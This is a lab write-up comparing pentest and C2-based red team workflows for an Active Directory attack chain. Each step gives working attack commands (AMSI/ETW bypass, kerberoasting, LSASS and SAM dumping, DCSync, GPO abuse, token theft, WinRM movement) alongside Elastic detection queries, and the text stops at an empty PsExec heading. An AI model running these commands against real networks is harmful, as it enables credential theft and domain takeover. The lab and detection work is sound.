---
title: "Red Team vs Pentest: Active Directory Attack Workflow"
kicker: "Red Team · Active Directory · C2"
tags: "Red Team · Adaptix C2 · Active Directory · Elastic SIEM/EDR"
lead: "A side-by-side comparison of pentest and C2-based red team approaches to the same Active Directory attack chain. Each technique is mapped with the pentest command, the Adaptix C2 equivalent, the OPSEC difference, and what Elastic detects (or misses). The techniques and detection logic apply to any Active Directory environment. GOAD-Light is used as the lab, not the focus."
---

> This post maps common Active Directory attack techniques to their red team C2 equivalents and compares the detection footprint of each. Every section shows the pentest command, the C2 command, the OPSEC difference, and the Elastic query to detect the action. The techniques, detection queries, and OPSEC analysis apply to any Active Directory environment. GOAD-Light is the lab used to demonstrate them, not the subject of this post.
>
> All C2 commands run from an active Adaptix C2 [Kharon agent](https://github.com/entropy-z/Kharonto) session. All Elastic queries run in Kibana Discover or the KQL bar.
>
> **Extension-Kit BOFs referenced:** AD-BOF, Creds-BOF, Elevation-BOF, Execution-BOF, Injection-BOF, LateralMovement-BOF, SAL-BOF, SAR-BOF, Process-BOF, Postex-BOF
>
> **Kerbeus-BOF:** Native C implementation of Rubeus, registered under `AD-BOF/Kerbeus-BOF/kerbeus.axs`. Uses Rubeus-style `/parameter:value` syntax.

---

## Lab Environment

This is Part 3 of an Active Directory series:

- [Part 1 - Building a Active Directory Cyber Range with Elastic on Ludus](https://stillbigjosh.github.io/writeup.html?file=writeups/goad-writeup.md) covers the lab build.
- [Part 2 - Detection Scenarios for Active Directory](https://stillbigjosh.github.io/writeup.html?file=writeups/detection-scenarios.md) covers some detection scenarios using Elastic.
- **Part 3 (this post)** runs the same attack chain through a C2 framework and compares the detection footprint against the pentest approach.

The lab uses GOAD-Light (a multi-domain Active Directory environment with intentional misconfigurations) with Elastic Security as the SIEM/EDR layer. The topology is a standard forest with a parent domain, a child domain, two domain controllers, and a member server. Any AD lab with similar structure would produce the same results. The only addition for this post is an **Adaptix C2 server** (LXC container, 10.1.10.50). Adaptix is the C2 server. [Kharon](https://github.com/entropy-z/Kharon) is the agent that runs on target hosts.

| Host | Role | IP | OS | Domain |
|------|------|----|----|--------|
| kingslanding (DC01) | Primary DC | 10.1.10.10 | Windows Server 2019 | sevenkingdoms.local |
| winterfell (DC02) | Child DC | 10.1.10.11 | Windows Server 2019 | north.sevenkingdoms.local |
| castelblack (SRV02) | Member server | 10.1.10.22 | Windows Server 2019 | north.sevenkingdoms.local |
| Elastic | SIEM/EDR | 10.1.20.2 | Debian (Docker) | N/A |
| Adaptix C2 | C2 server | 10.1.10.50 | Debian (LXC) | N/A |

## Network Topology

![GOAD-Light + Adaptix C2 network topology](image/red-team-workflow/goadlight-adaptix-topology.svg)


## 1 - Initial Foothold

### 1.1 - Starting Point

This workflow starts from a [Kharon agent](https://github.com/entropy-z/Kharonto) running as `samwell.tarly` on castelblack (SRV02, 10.1.10.22). 



**Active agent:**

| Field | Value |
|-------|-------|
| Host | castelblack (SRV02) |
| IP | 10.1.10.22 |
| User | NORTH\samwell.tarly |
| Privilege | Low (standard domain user, no local admin) |
| Agent | Kharon HTTP |

samwell.tarly is a regular domain user with no local administrator privileges. All reconnaissance, credential access, privilege escalation, and lateral movement begins from this low-privilege foothold. The engagement progresses from workstation to domain controller through escalation and lateral movement.

### 1.2 - Agent Configuration

**MITRE ATT&CK:** T1562.001 (Impair Defenses: Disable or Modify Tools), T1027 (Obfuscated Files or Information), T1134.004 (Parent PID Spoofing), T1036.005 (Masquerading: Match Legitimate Name or Location), T1106 (Native API)

After the agent checks in, set the configuration to reduce detection surface. Run these commands from the castelblack agent session.

**C2 Commands (run on the castelblack agent, repeat on each new agent as they check in):**

```
config sleep 5000
config jitter 30
config ppid 0
config blockdlls true
config mask.beacon timer
config mask.heap true
config amsi_etw_bypass all
config syscall spoof_indirect
config bof_api_proxy true
config spawnto C:\Windows\System32\RuntimeBroker.exe
```

| Setting | Purpose |
|---------|---------|
| `sleep 5000` / `jitter 30` | Set callback interval to 5 seconds with 30% randomness. The beacon interval varies between 3500ms and 6500ms. |
| `blockdlls true` | Block non-Microsoft-signed DLLs from loading in spawned child processes. This stops EDR injection hooks. |
| `mask.beacon timer` | Encrypt the beacon memory region during sleep. Uses timer-queue callbacks with ROP chain to flip memory to RW, encrypt, sleep, decrypt, flip back to RX. |
| `mask.heap true` | Encrypt heap allocations during sleep. Prevents memory scanners from finding strings and config data. |
| `amsi_etw_bypass all` | Patch AMSI and ETW before `execute-assembly` or `dotnet` commands. Prevents .NET telemetry from reaching Defender and Elastic. |
| `syscall spoof_indirect` | Use indirect syscalls with stack spoofing. All Nt* API calls go through `ntdll.dll` instruction addresses with a spoofed call stack. |
| `bof_api_proxy true` | Route BOF API calls through the beacon's internal proxy. This applies stack spoofing and indirect syscalls to BOF modules. |
| `spawnto RuntimeBroker.exe` | Set the sacrificial process for fork-and-run operations to RuntimeBroker.exe. This is a legitimate Windows process that commonly runs in user sessions. |

**Elastic Query - Detect Beacon Sleep Obfuscation:**

No direct detection. Sleep obfuscation is an in-memory technique. The best detection is memory scanning via Elastic Defend behavioral alerts:

```
event.module:"endpoint" AND event.action:"Memory Threat Detection Alert"
```

---

## 2 - Reconnaissance (from castelblack foothold)

All enumeration in this section runs from the low-privilege samwell.tarly agent on castelblack (SRV02). This is the key difference from the pentest approach: instead of scanning from an external Kali host, every query originates from a domain-joined member server. The traffic blends with normal Active Directory operations. No local admin privileges are required for any of these actions.

### 2.1 - Host Discovery

**MITRE ATT&CK:** T1046 (Network Service Discovery)

**Pentest Command (from Kali):**

```bash
nmap -sn -n -v 10.1.10.0/24
```

**C2 Command (from castelblack agent):**

```
smartscan 10.1.10.0/24 -p standart
```

This runs the SAR-BOF `smartscan` module from the castelblack agent. It is a single-threaded silent port scanner. The `-p standart` mode (note: the typo is in the BOF source code) scans approximately 20 ports including 135, 139, 445, 3389, 5985, 5986, 22, 21, 25, 53. For a narrower scan, specify ports directly:

```
smartscan 10.1.10.0/24 -p 445
```

![](image/red-team-workflow/20260921161326.png)

![](image/red-team-workflow/20260921161345.png)


**OPSEC Comparison:**

| Factor | Pentest (nmap) | Red Team (smartscan BOF) |
|--------|----------------|--------------------------|
| Traffic origin | External (Kali IP) | Internal (SRV02 IP) |
| Protocol | ICMP echo | TCP connect |
| Volume | 256 hosts, all ports | 256 hosts, selected ports |
| Signature | nmap user-agent / TTL anomalies | Normal TCP connection from domain host |

**Elastic Query - Detect Internal Port Scan:**

Prebuilt rule:

```
rule.name:"Potential Network Scan Executed From Host"
```

Custom query for high connection volume from a single source:

```
event.category:"network" AND destination.port:445 AND source.ip:"10.1.10.22"
```

![](image/red-team-workflow/20260921162237.png)

The smartscan output shows its also relatively noisy. A quieter alternative: list the ARP table of castelblack to discover neighbors without network scan telemetry.

![](image/red-team-workflow/20260921162851.png)

This avoids the detection signals and telemetry that smartscan generates.

---

### 2.2 - SMB User Enumeration

**MITRE ATT&CK:** T1087.002 (Account Discovery: Domain Account)

**Pentest Command (from Kali):**

```bash
# Anonymous authentication allowed
nxc smb 10.1.10.11 --users
```

**C2 Command (from castelblack agent):**

Targeted ldapsearch query as user `samwell.tarly`

```shell
ldapsearch (objectClass=user) -a sAMAccountName,description,memberOf,lastLogon
```

This runs the AD-BOF `ldapsearch` module. It sends an LDAP query from the beacon's current token context. LDAP queries from a domain-joined machine are standard Active Directory traffic.

![](image/red-team-workflow/20260921164422.png)

Full syntax reference:

```
ldapsearch <query> [-a attributes] [-c count] [-s scope] [--dc dc] [--dn dn] [--ldaps]
```

**OPSEC Comparison:**

| Factor | Pentest (nxc --users) | Red Team (ldapsearch BOF) |
|--------|------------------------|--------------------------|
| Protocol | SMB + SAMR RPC | LDAP (port 389) |
| Authentication | Explicit credentials on wire | Current Kerberos token |
| Visibility | SAMR enumeration logged | Standard LDAP query, normal AD traffic |
| Sysmon coverage | Named pipe events (Event ID 17/18) for samr | No Sysmon event for LDAP |

**Elastic Query - Detect LDAP Enumeration:**

Prebuilt rule - The prebuilt rule only fires on sensitive attributes (`userPassword`, `unicodePwd`, `msDS-ManagedPassword`). Standard recon attributes like `sAMAccountName` and `memberOf` do not trigger it:

```
rule.name:"Suspicious Access to LDAP Attributes"
```

Attempted detection via Sysmon Event ID 3 (network connection). This query looks for non-standard processes making LDAP connections to port 389. Processes like `RuntimeBroker.exe`, `notepad.exe`, or other non-AD binaries connecting to LDAP would be anomalous:

```
event.code:"3" AND destination.port:389 AND NOT process.name:("lsass.exe" OR "dns.exe" OR "Microsoft.ActiveDirectory.WebServices.exe" OR "svchost.exe" OR "mmc.exe" OR "dsac.exe" OR "ServerManager.exe")
```

![](image/red-team-workflow/20260921163832.png)

Also attempted filtering by source IP:

```
event.code:"3" AND destination.port:389 AND source.ip:"10.1.10.22"
```

![](image/red-team-workflow/20260921164001.png)

**Result: No matches for either query.**

The `ldapsearch` BOF runs inline within the beacon process, entirely in memory. It does not spawn a child process. It does not create a new network connection that Sysmon logs independently.

The LDAP call executes inside the beacon's own thread and uses the process token. The connection inherits the beacon host process context. If the beacon lives in `rundll32.exe` or `svchost.exe`, the process name is already in the exclusion list.

Even if the process name were unusual, Sysmon Event ID 3 did not fire at all for this inline BOF execution. This confirms that in-process BOF LDAP queries produce zero Sysmon network telemetry on the source host.

Detection requires LDAP query auditing on the domain controller side (Event ID 1644). This is not enabled by default. To enable it, set the following registry key on each DC:

```
HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics\15 Field Engineering = 5 (DWORD)
```

Enable via Proxmox on both DCs:

```bash
# DC02 (winterfell, VMID 111)
ssh root@192.168.1.100 "qm guest exec 111 -- powershell.exe -Command 'Set-ItemProperty -Path \"HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics\" -Name \"15 Field Engineering\" -Value 5'"

# DC01 (kingslanding, VMID 110)
ssh root@192.168.1.100 "qm guest exec 110 -- powershell.exe -Command 'Set-ItemProperty -Path \"HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics\" -Name \"15 Field Engineering\" -Value 5'"
```

Without this registry key, the DC does not log LDAP queries. Any detection results for inline BOF LDAP activity are only valid after enabling this setting.

After enabling, query for Event ID 1644 in Elastic:

```
event.code:"1644"
```

Filter by source host to isolate activity from the beacon:

```
event.code:"1644" AND winlog.event_data.SearchFilter:*objectClass*
```

Filter by specific LDAP filter strings used during reconnaissance:

```
event.code:"1644" AND (winlog.event_data.SearchFilter:*sAMAccountName* OR winlog.event_data.SearchFilter:*servicePrincipalName* OR winlog.event_data.SearchFilter:*userAccountControl*)
```

---

### 2.3 - Share Enumeration

**MITRE ATT&CK:** T1135 (Network Share Discovery)

**Pentest Command (from Kali):**

```bash
nxc smb 10.1.10.22 -u samwell.tarly -p Heartsbane --shares

smbclient -U "samwell.tarly" //10.1.10.22/all
```

**C2 Command (from castelblack agent):**

First, make a token for samwell.tarly if not already impersonating:

```
token make -d north.sevenkingdoms.local -u samwell.tarly -p Heartsbane
```

**Option A - SOCKS + nxc / cmd net view:**

Then use the SOCKS proxy and proxychains from Kali:

```
socks start 1080
```

From Kali (run from the Kali terminal):

```bash
proxychains -q nxc smb 10.1.10.22 -u samwell.tarly -p Heartsbane --shares
```

Or use `process create` with `net view` (no SOCKS needed, but creates a child process):

```
process create --command "cmd.exe /c net view \\10.1.10.22 /all" --pipe true
```

There is no dedicated "share enum" BOF in the Extension-Kit. The SOCKS proxy method is preferred because it does not create a child process on the beacon host. 

However, if you must use `process create`, spoof the PPID of the child process for evasion. The workflow:

Search the process list for a suitable parent. `svchost` is a good candidate.

![](image/red-team-workflow/20260921165306.png)

A process like `msedge` as the parent would raise suspicion. There is no legitimate reason for `msedge` to spawn `cmd.exe`.

```
help config ppid
config ppid 716
```


![](image/red-team-workflow/20260921165526.png)

Then run `process create` (this returned no output due to a bug in the [Kharon agent](https://github.com/entropy-z/Kharonto), but you can substitute any command that achieves the same result):

```
process create --command "cmd.exe /c net view \\10.1.10.22 /all" --pipe true
```

**Option B - Using Built-in commands:**

```
fs ls \\10.1.10.22\all
fs cat \\10.1.10.22\all\arya.txt
```

![](image/red-team-workflow/20260922160926.png)

`arya.stark` left a note that alludes to a sword named `Needle`. 


**OPSEC Comparison:**

| Factor | Pentest (nxc/smbclient) | SOCKS + nxc / cmd net view | Using Built-in commands |
|--------|--------------------------|--------------------------------------|---------------------------|
| Traffic origin | External Kali IP | Internal SRV02 IP | Internal SRV02 IP |
| Authentication | NTLM (password on wire) | Kerberos (via impersonated token) or NTLM through SOCKS | Impersonated token |
| Process artifact | None on target | cmd.exe child process if using `process create` | None |

**Elastic Query - Detect Share Enumeration:**

Prebuilt rule:

```
rule.name:"Windows Network Enumeration"
```

KQL Query - For `net view` process creation:

```
event.code:"1" AND process.name:"net.exe" AND process.command_line:*view*
```

![](image/red-team-workflow/20260921171757.png)

Parent process spoofing does not help if the command-line arguments are suspicious. The `netshare` BOF from the Situational Awareness suite would avoid this detection entirely. However, `netshare` was not part of our Adaptix Extension-Kit. The usage of Built-in commands also avoid this detection entirely, but it requires prior knowledge of the exact share name. 


---

### 2.4 - BloodHound Collection

**MITRE ATT&CK:** T1087.002 (Account Discovery: Domain Account), T1069.002 (Permission Groups Discovery: Domain Groups), T1482 (Domain Trust Discovery)

**Pentest Command (from Kali):**

```bash
bloodhound-python -d north.sevenkingdoms.local -u 'samwell.tarly' -p 'Heartsbane' -dc winterfell.north.sevenkingdoms.local -ns 10.1.10.11 -c ALL
```

**C2 Command (from castelblack agent):**

**Option A - In-memory SharpHound via execute-assembly (bad OPSEC):** This runs inline, but it loads the .NET CLR into the agent process. The CLR cannot be unloaded after execution. Defenders can detect its presence for the remainder of the process lifetime.

```
execute-assembly /path/to/SharpHound.exe -c Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs --Throttle 3000 --Jitter 50
```

**Option B - BOF-based ldapsearch enumeration (lower signature):**

```shell
# User enumeration
ldapsearch (objectClass=user) -a sAMAccountName,memberOf,servicePrincipalName,msDS-AllowedToDelegateTo,userAccountControl
# Computer enumeration
ldapsearch (objectClass=computer) -a sAMAccountName,operatingSystem,dNSHostName,msDS-AllowedToActOnBehalfOfOtherIdentity
# Group enumeration
ldapsearch (objectClass=group) -a sAMAccountName,member
```

![](image/red-team-workflow/20260922173255.png)

Full `ldapsearch` syntax:

```
ldapsearch <query> [-a attributes] [--dc dc] [--dn dn]
```

Interesting finds from output:

jon.snow has Contrained Delegation right to CIFS/winterfell

![](image/red-team-workflow/20260921173857.png)

SPN set on sql_svc

![](image/red-team-workflow/20260921174021.png)

**OPSEC Comparison:**

| Factor | Pentest (bloodhound-python) | Red Team Option A (SharpHound) | Red Team Option B (ldapsearch BOF) |
|--------|----------------------------|-------------------------------|-----------------------------------|
| Protocol | LDAP from Kali | LDAP from beacon process | LDAP from beacon process (inline BOF) |
| Disk artifact | None | None (in-memory) | None (BOF, no CLR loaded) |
| Detection | LDAP volume spike | LDAP volume + .NET assembly load (CLR remains loaded in process) | Standard LDAP queries, no Sysmon Event ID 3 telemetry (see Section 2.2) |
| AMSI | N/A | Bypassed via `amsi_etw_bypass all` | N/A (native C BOF, no CLR involvement) |
| Child process | None | None (inline) | None (inline) |

**Elastic Query - Detect SharpHound (Option A):**

Prebuilt rule 

```
rule.name:"Enumeration of Privileged Local Groups Membership"
```

```
rule.name:"Suspicious Access to LDAP Attributes"
```

**Elastic Query - Detect ldapsearch BOF (Option B):**

No prebuilt rule fires. The inline BOF produces zero Sysmon network telemetry on the source host (see Section 2.2 for full analysis). Detection requires DC-side LDAP query auditing (Event ID 1644).

---

## 3 - Credential Access

### 3.1 - AS-REP Roasting

**MITRE ATT&CK:** T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting)

**Pentest Command (from Kali):**

```bash
impacket-GetNPUsers -dc-ip 10.1.10.11 north.sevenkingdoms.local/samwell.tarly:'Heartsbane'
```

**C2 Command (from castelblack agent):**

```shell
# First enumerate asreproastable users
ldapsearch "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
```

![](image/red-team-workflow/20260921175805.png)

```shell
# Then asreproast the user
kerbeus asreproasting /user:brandon.stark /domain:north.sevenkingdoms.local
```

![](image/red-team-workflow/20260921175835.png)

Full syntax:

```
kerbeus asreproasting /user:USER [/dc:DC] [/domain:DOMAIN]
```

The `kerbeus` BOF sends a Kerberos AS-REQ with `DONT_REQ_PREAUTH` for the target user. The DC returns an AS-REP with the encrypted portion that can be cracked offline.

**OPSEC Comparison:**

| Factor | Pentest (GetNPUsers) | Red Team (kerbeus BOF) |
|--------|---------------------|----------------------|
| Traffic origin | External Kali IP | Internal SRV02 IP |
| Protocol | Kerberos AS-REQ | Kerberos AS-REQ |
| Process artifact | None on target | None (BOF runs in beacon memory) |
| Detection | Same Kerberos event | Same Kerberos event |

Both methods produce the same Event ID 4768 (TGT request) on the DC. The difference is the source IP.

**Elastic Query - Detect AS-REP Roasting:**

```
event.code:"4768" AND winlog.event_data.PreAuthType:"0"
```

![](image/red-team-workflow/20260921180011.png)

No prebuilt Elastic rule fires on AS-REP roasting in the current 152-rule set. This requires a custom rule.

---

### 3.2 - Kerberoasting

**MITRE ATT&CK:** T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)

**Pentest Command (from Kali):**

```bash
impacket-GetUserSPNs -dc-ip 10.1.10.11 north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -request
```

**C2 Command (from castelblack agent):**

Step 1 - Enumerate SPN-bearing accounts:

```
ldapsearch (servicePrincipalName=*) -a sAMAccountName,servicePrincipalName,pwdLastSet,lastLogon
```

![](image/red-team-workflow/20260921180123.png)

![](image/red-team-workflow/20260921180145.png)

Step 2 - Request a TGT (needed as input to kerberoasting):

```
kerbeus asktgt /user:samwell.tarly /password:Heartsbane /domain:north.sevenkingdoms.local /enctype:aes256 /opsec
```

![](image/red-team-workflow/20260921180318.png)

Step 3 - Request TGS for the target SPN using the TGT. Request one SPN at a time (OPSEC: do not spray all SPNs at once):

```
kerbeus kerberoasting /spn:CIFS/winterfell.north.sevenkingdoms.local /ticket:<base64_tgt_from_step2>
```

![](image/red-team-workflow/20260921180603.png)

Full syntax:

```
kerbeus kerberoasting /spn:SPN /ticket:BASE64 [/dc:DC] [/domain:DOMAIN]
kerbeus kerberoasting /spn:SPN /nopreauth:USER [/dc:DC] [/domain:DOMAIN]
```

Step 4 - Crack the TGS hash offline on Kali:

```bash
hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
```

**OPSEC Comparison:**

| Factor | Pentest (GetUserSPNs -request) | Red Team (kerbeus kerberoasting) |
|--------|-------------------------------|--------------------------------|
| Volume | All SPN accounts at once | Single targeted SPN |
| Encryption | RC4 (0x17) by default | Depends on target account, uses account's supported enctype |
| Source | External IP | Internal domain host |
| Detection | Multiple 4769 events in rapid sequence | Single 4769 event, normal traffic pattern |

**Elastic Query - Detect Kerberoasting:**

```
event.code:"4769" AND winlog.event_data.TicketEncryptionType:"0x17" AND NOT winlog.event_data.ServiceName:*$
```

![](image/red-team-workflow/20260921180903.png)

This detects RC4 TGS requests for user accounts (not machine accounts). No prebuilt Elastic rule covers this. Custom rule required.

---

### 3.3 - LSASS Credential Dumping (mimikatz / sekurlsa::logonpasswords)

**MITRE ATT&CK:** T1003.001 (OS Credential Dumping: LSASS Memory), T1003.002 (Security Account Manager), T1003.004 (LSA Secrets), T1003.005 (Cached Domain Credentials)

> After finding `jeor.mormont`'s password in `secret.ps1` on the NETLOGON share (accessed as `jon.snow`)

**Pentest Command (from castelblack via RDP):**

```
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

**C2 Command (from castelblack agent):**

**Option A - nanodump BOF (requires SYSTEM, touches LSASS, bad OPSEC):**

```
nanodump -sc --valid -w C:\Windows\Temp\debug.log
```

Full nanodump syntax:

```
nanodump [-w DUMP_PATH] [--valid] [-d] [-de] [-sc] [--fork] [--snapshot] [-eh] [--getpid] [--pid PID]
```

| Flag | Purpose |
|------|---------|
| `-sc` | Open LSASS handle using spoofed callstack. Evades Sysmon Event 10 ProcessAccess rules that check the CallTrace field. |
| `--valid` | Create dump with a valid MiniDump signature. Required for parsing with pypykatz. |
| `-w` | Write the dump to the specified file path. |
| `--fork` | Fork the LSASS process before dumping. Reduces time the LSASS handle is held open. |
| `--snapshot` | Snapshot the LSASS process before dumping. |

Then download and parse offline:

```
download C:\Windows\Temp\debug.log
```

From Kali:

```bash
pypykatz lsa minidump debug.log
```

Clean up the dump file:

```
fs rm C:\Windows\Temp\debug.log
```

**Option B - hashdump BOF (recommended, runs as `jeor.mormont`, SAM hive, local accounts only):**

```
hashdump
```

![](image/red-team-workflow/20260921182208.png)

**Option C running as SYSTEM - lsadump BOFs:**

This reads secrets from the local registry and does not touch LSASS

```
lsadump_secrets
lsadump_cache
```

**OPSEC Comparison:**

| Factor              | Pentest (mimikatz on disk)                         | Red Team Option A (nanodump -sc BOF)               | Red Team Option B (hashdump BOF) recommended     |
| ------------------- | -------------------------------------------------- | -------------------------------------------------- | ------------------------------------------------ |
| Disk artifact       | mimikatz.exe on disk                               | Minidump file (delete after download)              | None                                             |
| Process access      | OpenProcess on lsass.exe                           | Spoofed callstack, indirect handle duplication     | Registry hive read                               |
| Sysmon Event 10     | Yes (ProcessAccess to lsass)                       | Reduced: spoofed callstack evades CallTrace checks | No (registry-based)                              |
| Elastic rules fired | Multiple: LSASS Memory Dump, Mimikatz Memssp, etc. | Possibly: Suspicious Lsass Process Access          | Credential Acquisition via Registry Hive Dumping |

**Elastic Queries - Detect Credential Dumping:**

Prebuilt rule - For any LSASS access:

```
rule.name:"LSASS Memory Dump Handle Access" OR rule.name:"LSASS Memory Dump Creation" OR rule.name:"Suspicious Lsass Process Access" OR rule.name:"LSASS Process Access via Windows API"
```

Prebuilt rule - For mimikatz specifically:

```
rule.name:"Potential Invoke-Mimikatz PowerShell Script" OR rule.name:"Mimikatz Memssp Log File Detected"
```

Prebuilt rule - For SAM/registry credential access:

```
rule.name:"Credential Acquisition via Registry Hive Dumping"
```

Sysmon Event 10 (ProcessAccess) for lsass:

```
event.code:"10" AND winlog.event_data.TargetImage:*lsass.exe*
```

Only Option B (recommended) was run. No LSASS access event was generated. This confirms the advantage of the SAM-based approach over touching `lsass.exe`.

![](image/red-team-workflow/20260921182843.png)

---

The SAM dump only returned the local Administrator hash. To get domain credentials without touching LSASS, steal the token of `robb.stark` (Domain Admin) if a process runs under that account on castelblack.

```
token steal 3852
token list
token impersonate 1
```


---

### 3.4 - DCSync

**MITRE ATT&CK:** T1003.006 (OS Credential Dumping: DCSync)

**Pentest Command (from Kali):**

```bash
secretsdump.py north.sevenkingdoms.local/robb.stark:sexywolfy@10.1.10.11
```

Or the ExtraSids variant:

```bash
raiseChild.py -target-exec 10.1.10.10 north.sevenkingdoms.local/samwell.tarly:Heartsbane
```

**C2 Command (from castelblack agent):**

```shell
token make -u robb.stark -p sexywolfy -d north.sevenkingdoms.local
token list
token impersonate 7979
# Confirm access
kerbeus klist
```

![](image/red-team-workflow/20260921190554.png)

![](image/red-team-workflow/20260921190613.png)


The Extension-Kit includes a DCSync BOF under AD-BOF. Use the `dcsync` command:

For a single account with explicit DC targeting (significantly less noisy than `dcsync all`):

```
dcsync single krbtgt -dc winterfell.north.sevenkingdoms.local
dcsync single arya.stark -dc winterfell.north.sevenkingdoms.local
dcsync single sansa.stark -dc winterfell.north.sevenkingdoms.local
```

![](image/red-team-workflow/20260921190822.png)

![](image/red-team-workflow/20260921191656.png)

For all domain users (very loud, not recommended):

```
dcsync all --only-nt --only-users
```

Full syntax:

```
dcsync single <target> [-ou OU] [-dc DC] [--ldaps] [--only-nt]
dcsync all [-ou OU] [-dc DC] [--ldaps] [--only-nt] [--only-users]
```

**Preferred alternative when you already have SYSTEM on a DC:** Use `lsadump_secrets` on the DC. This reads secrets from the local registry and does not generate DCSync replication traffic.

```
lsadump_secrets
```

**OPSEC Warning:** DCSync generates multiple Event ID 4662 entries (Directory Service Access) with replication-specific GUIDs. This is heavily monitored. Prefer `lsadump_secrets` when SYSTEM access on a DC is available.

**Elastic Queries - Detect DCSync:**

Prebuilt rule:

```
rule.name:"Potential Credential Access via DCSync" OR rule.name:"FirstTime Seen Account Performing DCSync"
```

![](image/red-team-workflow/20260921192031.png)

Despite the targeted single-account DCSync, the `Potential Credential Access via DCSync` rule still fired.

Custom Sysmon/Windows Security query:

```
event.code:"4662" AND winlog.event_data.Properties:*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*
```

The GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` corresponds to `DS-Replication-Get-Changes`.

---

## 4 - Privilege Escalation

### 4.1 - GPO Abuse (samwell.tarly GenericWrite on STARKWALLPAPER)

**MITRE ATT&CK:** T1484.001 (Domain or Tenant Policy Modification: Group Policy Modification)

**Pentest Command (from Kali):**

```bash
python3 pygpoabuse.py 'north.sevenkingdoms.local/samwell.tarly:Heartsbane' \
  -gpo-id "02069b0e-d6c4-49e9-bea3-68adf6b109a6" \
  -command 'net localgroup administrators samwell.tarly /add' \
  -taskname 'Update' -f
```

**C2 Command (from castelblack agent):**

Run pygpoabuse through the SOCKS proxy. No Extension-Kit BOF exists for GPO manipulation(best approach). We could have used the SharpGPOAbuse .NET binary instead and run it via inline execute.assembly, but we want to avoid permanently loading the CLR into our agent process and also avoid fork and run. 

```
token revert
socks start 1080
```

From Kali:

```bash
proxychains -q python3 ~/TOOLS/ACTIVEDIR/pyGPOAbuse/pygpoabuse.py \
  'north.sevenkingdoms.local/samwell.tarly:Heartsbane' \
  -gpo-id "02069b0e-d6c4-49e9-bea3-68adf6b109a6" \
  -command 'net localgroup administrators samwell.tarly /add' \
  -taskname 'Update' -f \
  -dc-ip 10.1.10.11
```

![](image/red-team-workflow/20260921193926.png)

Then force GPO update as any user

```
process create --command "cmd.exe /c gpupdate /force"
```

![](image/red-team-workflow/20260921194400.png)

The SOCKS proxy routes the LDAP/SMB traffic through the beacon so the DC sees traffic from castelblack (10.1.10.22), not from an external IP.

**OPSEC Comparison:**

| Factor | Pentest (direct pygpoabuse) | Red Team (pygpoabuse via SOCKS) |
|--------|---------------------------|-------------------------------|
| Source IP | Kali IP | SRV02 IP (via SOCKS) |
| Protocol | SMB + LDAP to DC | Same, but sourced internally |
| GPO modification | Immediate Scheduled Task in SYSVOL | Same mechanism |
| Detection | GPO change + scheduled task creation | Same detection, different source IP |

**Elastic Queries - Detect GPO Abuse:**

Prebuilt rule:

```
rule.name:"Group Policy Abuse for Privilege Addition"
```

```
rule.name:"A scheduled task was created"
```

KQL Query. For the net localgroup command execution on the target:

```
event.code:"1" AND process.name:"net.exe" AND process.command_line:*localgroup* AND process.command_line:*administrators*
```

![](image/red-team-workflow/20260921194836.png)

---

### 4.2 - Local Privilege Escalation (to SYSTEM on castelblack)

**MITRE ATT&CK:** T1134.001 (Access Token Manipulation: Token Impersonation/Theft), T1068 (Exploitation for Privilege Escalation)

**Pentest approach:** Not needed in the pentest path. `evil-winrm` with admin credentials already runs as admin.

**C2 Command (from castelblack agent, running as samwell.tarly or jeor.mormont):**

After GPO abuse adds samwell.tarly to local Administrators, or after obtaining jeor.mormont credentials (who is already a local admin on castelblack), escalate to SYSTEM:

**Option A - getsystem BOF (recommended):**

```
token revert
getsystem token
```

![](image/red-team-workflow/20260921192626.png)


This elevates the current agent to SYSTEM and gains TrustedInstaller group privilege through impersonation.

**Option B - Potato BOFs (if only SeImpersonate privilege is available):**

```
potato-dcom --token
```

Or:

```
potato-print --token
```

Full syntax:

```
potato-dcom --token
potato-dcom --run <program with args>
potato-print --token
potato-print --run <program with args>
```

**Elastic Queries - Detect Privilege Escalation:**

Prebuilt rules:

```
rule.name:"Privilege Escalation via Named Pipe Impersonation" OR rule.name:"Privilege Escalation via Rogue Named Pipe Impersonation"
```

```
rule.name:"Process Created with an Elevated Token"
```


---

## 5 - Lateral Movement

### 5.1 - WinRM (evil-winrm equivalent)

**MITRE ATT&CK:** T1021.006 (Remote Services: Windows Remote Management)

> This approach was not followed. An internal error occurred in the target WMI/WSMan subsystem.

**Pentest Command (from Kali):**

```bash
evil-winrm -i 10.1.10.11 -u samwell.tarly -p Heartsbane
```

**C2 Command (from castelblack agent):**

First make token as `samwell.tarly`

```
token make -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local
token list
token impersonate 7576
```

```
config amsi_etw_bypass all
invoke winrm winterfell.north.sevenkingdoms.local "whoami /all"
```

Or with explicit credentials:

```
config amsi_etw_bypass all
invoke winrm 10.1.10.11 "powershell -c 'Get-Process | Select-Object Name,Id'" -u north\samwell.tarly -p Heartsbane -t 10000
```

Full syntax:

```
invoke winrm <target> <command> [-t timeout_ms] [-b] [-u DOMAIN\user] [-p password]
```

| Flag | Purpose |
|------|---------|
| `-t` | Timeout in milliseconds. 0 = infinite (default). |
| `-b` | Background execution. Keep shell open without capturing output. |
| `-u` | Username in DOMAIN\user format for alternate credentials. |
| `-p` | Password for alternate credentials. |

**OPSEC Comparison:**

| Factor | Pentest (evil-winrm) | Red Team (invoke winrm BOF) |
|--------|---------------------|---------------------|
| Source | External Kali IP | Internal SRV02 IP |
| Authentication | NTLM (password) | Kerberos (current token) or explicit creds |
| Process on target | wsmprovhost.exe | wsmprovhost.exe |
| Persistent shell | Yes (interactive) | No (single command execution) |

**Elastic Queries - Detect WinRM Lateral Movement:**

```
rule.name:"Incoming Execution via WinRM Remote Shell"
```

```
rule.name:"Incoming Execution via PowerShell Remoting"
```

---

### 5.2 - PsExec (Service-based Lateral Movement)

